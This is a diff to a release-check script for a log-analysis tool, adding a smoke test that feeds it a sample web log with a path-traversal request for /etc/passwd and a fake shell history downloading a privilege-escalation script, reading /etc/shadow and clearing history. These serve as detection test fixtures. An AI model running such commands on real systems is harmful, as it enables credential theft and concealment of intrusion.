@@ -46,6 +46,9 @@ def _check_release_surfaces(version: str) -> None:
         ROOT / "README.md",
         ROOT / "bla_cli.py",
         ROOT / "bla" / "__version__.py",
+        ROOT / "bla" / "output" / "geo_map.py",
+        ROOT / "bla" / "output" / "assets" / "world-countries.geojson",
+        ROOT / "bla" / "parsers" / "shell_history.py",
         ROOT / "docs" / "releases" / f"v{version}.md",
         ROOT / "sample_logs" / "auth.log",
         ROOT / "sample_logs" / "windows_rdp_sample.xml",
@@ -100,6 +103,10 @@ def _check_distribution(version: str) -> None:
         names = set(archive.namelist())
         _assert("bla/rules/web_attacks.yaml" in names, "wheel is missing bla/rules/web_attacks.yaml")
         _assert("bla/output/assets/bla-logo.png" in names, "wheel is missing bla/output/assets/bla-logo.png")
+        _assert("bla/output/assets/world-countries.geojson" in names,
+                "wheel is missing bla/output/assets/world-countries.geojson")
+        _assert("bla/output/geo_map.py" in names, "wheel is missing bla/output/geo_map.py")
+        _assert("bla/parsers/shell_history.py" in names, "wheel is missing bla/parsers/shell_history.py")
         _assert("bla/remote/ssh_workspace.py" in names, "wheel is missing bla/remote/ssh_workspace.py")
         _assert("bla/output/manifest.py" in names, "wheel is missing bla/output/manifest.py")
         _assert("bla_cli.py" in names, "wheel is missing bla_cli.py")
@@ -113,6 +120,9 @@ def _check_distribution(version: str) -> None:
             "/docs/screenshots/bla-p0-report-overview.png",
             "/docs/screenshots/bla-p0-incident-alerts.png",
             "/bla/output/assets/bla-logo.png",
+            "/bla/output/assets/world-countries.geojson",
+            "/bla/output/geo_map.py",
+            "/bla/parsers/shell_history.py",
             "/bla_cli.py",
             "/scripts/release_check.py",
             "/sample_logs/auth.log",
@@ -182,6 +192,77 @@ def _run_sample_smokes() -> None:
         _assert(manifest.get("outputs"), "manifest does not list report outputs")
 
 
+def _run_v141_feature_smoke() -> None:
+    """Exercise the v1.4.1 report features through the public CLI."""
+    with tempfile.TemporaryDirectory(prefix="bla-v141-smoke-") as tmp:
+        tmp_path = Path(tmp)
+        input_dir = tmp_path / "input"
+        input_dir.mkdir()
+        (input_dir / "access.log").write_text(
+            '9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] '
+            '"GET /wp-login.php HTTP/1.1" 404 10 "-" "curl/8"\n'
+            '9.9.9.9 - - [15/Mar/2024:10:00:01 +0800] '
+            '"GET /download.php?file=../../etc/passwd HTTP/1.1" 200 10 "-" "curl/8"\n',
+            encoding="utf-8",
+        )
+        (input_dir / ".bash_history").write_text(
+            "\n".join([
+                "whoami",
+                "wget https://example.test/linux-exploit-suggester.sh -O les.sh",
+                "sudo -l",
+                "cat /etc/shadow",
+                "history -c",
+            ]) + "\n",
+            encoding="utf-8",
+        )
+        geo_cache = tmp_path / "geo-cache.json"
+        geo_cache.write_text(
+            json.dumps({
+                "9.9.9.9": {
+                    "status": "success",
+                    "country": "United States",
+                    "regionName": "California",
+                    "city": "Berkeley",
+                }
+            }),
+            encoding="utf-8",
+        )
+        out_dir = tmp_path / "report"
+
+        _run([
+            sys.executable,
+            "bla_cli.py",
+            str(input_dir),
+            "--out",
+            str(out_dir),
+            "--geoip-cache",
+            str(geo_cache),
+            "--exit-on",
+            "none",
+            "--no-color",
+            "--max-alerts",
+            "5",
+        ])
+
+        html = (out_dir / "index.html").read_text(encoding="utf-8")
+        report = json.loads((out_dir / "report.json").read_text(encoding="utf-8"))
+        manifest = json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))
+
+        _assert("攻击源地理分布" in html, "v1.4.1 smoke report did not render the GeoIP map section")
+        _assert("United States" in html, "v1.4.1 smoke report did not render GeoIP cache country data")
+        _assert("Shell History" in html, "v1.4.1 smoke report did not include shell history parse results")
+        _assert("Linux 敏感凭据文件读取" in html, "v1.4.1 smoke report did not include shell history evidence")
+        _assert("Shell 凭据访问轨迹" in html, "v1.4.1 smoke report did not render shell history incident subjects")
+        _assert("未知实体" not in html, "v1.4.1 smoke report regressed to unknown incident subjects")
+        _assert("未知来源" not in json.dumps(report, ensure_ascii=False),
+                "v1.4.1 smoke JSON regressed to unknown incident descriptions")
+        _assert("cdn.jsdelivr" not in html, "v1.4.1 smoke report should remain offline and avoid CDN assets")
+        _assert(any(item.get("type") == "Shell History" for item in report.get("files", [])),
+                "v1.4.1 smoke JSON did not include Shell History as a parsed file")
+        _assert(any(item.get("type") == "Shell History" for item in manifest.get("parsed_files", [])),
+                "v1.4.1 smoke manifest did not include Shell History as a parsed file")
+
+
 def main() -> int:
     parser = argparse.ArgumentParser(description="Run BLA's local release safety checks.")
     parser.add_argument("--build", action="store_true", help="build and inspect wheel/sdist artifacts")
@@ -203,6 +284,7 @@ def main() -> int:
     for command in commands:
         _run(command)
     _run_sample_smokes()
+    _run_v141_feature_smoke()
 
     if args.build:
         _check_distribution(version)
